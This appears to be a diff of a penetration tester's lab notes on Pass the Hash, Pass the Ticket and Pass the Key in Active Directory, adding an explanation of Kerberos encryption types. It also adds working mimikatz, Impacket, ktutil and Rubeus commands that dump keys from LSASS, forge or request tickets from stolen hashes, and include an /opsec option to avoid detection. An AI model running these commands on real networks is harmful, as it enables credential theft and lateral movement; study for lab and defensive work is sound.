@@ -4,8 +4,8 @@ type: technique
 tags: [active-directory, credential-dumping, htb, lateral-movement, pass-the-hash, pass-the-ticket, post-exploitation, thm, windows]
 phase: post-exploitation
 date_created: 2026-05-08
-date_updated: 2026-05-08
-sources: [cpts-password-attacks, thm-ad-lateral]
+date_updated: 2026-09-10
+sources: [cpts-password-attacks, thm-ad-lateral, InternalAllTheThings]
 ---
 
 # Pass the Hash / Pass the Ticket / Pass the Key
@@ -249,6 +249,32 @@ Enter-PSSession -ComputerName DC01
 
 ### Pass the Key / Overpass the Hash
 
+**Pass the Key** uses Kerberos encryption keys (AES128, AES256, or RC4/NTLM) extracted from LSASS to request a TGT without the plaintext password; **Overpass-the-Hash** is the RC4 case, turning the NTLM hash into a Kerberos credential. Both operate entirely inside Kerberos, so they work where NTLM is blocked and are less visible to NTLM-focused detection.
+
+Pre-authentication requires a secret key derived from the user's password; the enctype determines what you hold:
+
+- **RC4**: ARCFOUR-HMAC-MD5 (23), this is the NTLM hash; use it directly as Pass the Hash above, or request a TGT from it as below.
+- **DES**: DES3-CBC-SHA1 (16), deprecated since 2018 ([RFC 8429](https://www.rfc-editor.org/rfc/rfc8429)).
+- **AES128**: AES128-CTS-HMAC-SHA1-96 (17), usable with Impacket and Rubeus.
+- **AES256**: AES256-CTS-HMAC-SHA1-96 (18).
+
+| enctype | weak? | krb5 | Windows |
+|---------|-------|------|---------|
+| des-cbc-crc | weak | <1.18 | >=2000 |
+| des-cbc-md4 | weak | <1.18 | ? |
+| des-cbc-md5 | weak | <1.18 | >=2000 |
+| des3-cbc-sha1 | | >=1.1 | none |
+| arcfour-hmac | | >=1.3 | >=2000 |
+| arcfour-hmac-exp | weak | >=1.3 | >=2000 |
+| aes128-cts-hmac-sha1-96 | | >=1.3 | >=Vista |
+| aes256-cts-hmac-sha1-96 | | >=1.3 | >=Vista |
+| aes128-cts-hmac-sha256-128 | | >=1.15 | none |
+| aes256-cts-hmac-sha384-192 | | >=1.15 | none |
+| camellia128-cts-cmac | | >=1.9 | none |
+| camellia256-cts-cmac | | >=1.9 | none |
+
+Microsoft Windows releases Windows 7 and later disable single-DES enctypes by default.
+
 ```powershell
 # Extract Kerberos keys from LSASS
 mimikatz.exe privilege::debug "sekurlsa::ekeys"
@@ -264,9 +290,29 @@ mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b6
 mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:<hash> /run:cmd.exe
 ```
 
+```bash
+# getTGT.py with the NT hash (Overpass-the-Hash from Linux)
+root@kali:~$ python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
+root@kali:~$ export KRB5CCNAME="/root/impacket-examples/velociraptor.ccache"
+root@kali:~$ python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park" -k -no-pass
+
+# ktutil/kinit: load the NT hash into a keytab, then kinit a TGT
+root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
+root@kali:~$ kinit -t ~/mykeys tgwynn@LAB.ROPNOP.COM
+root@kali:~$ klist
+
+# ticketer / getTGT with an AES key (Pass the Key)
+impacket-ticketer -aesKey 2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574 -domain lab.local Administrator -domain-sid S-1-5-21-2218639424-46377867-3078535060
+impacket-getTGT -aesKey 2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574 lab.local
+```
+
 ```powershell
 # Rubeus: request TGT from AES256 key
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+
+# Rubeus: AES128, and AES256 with /opsec (avoids the RC4 encryption-downgrade signal)
+.\Rubeus.exe asktgt /user:Administrator /aes128 bc09f84dcb4eabccb981a9f265035a72 /ptt
+.\Rubeus.exe asktgt /user:Administrator /aes256:2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574 /opsec /ptt
 ```
 
 ---
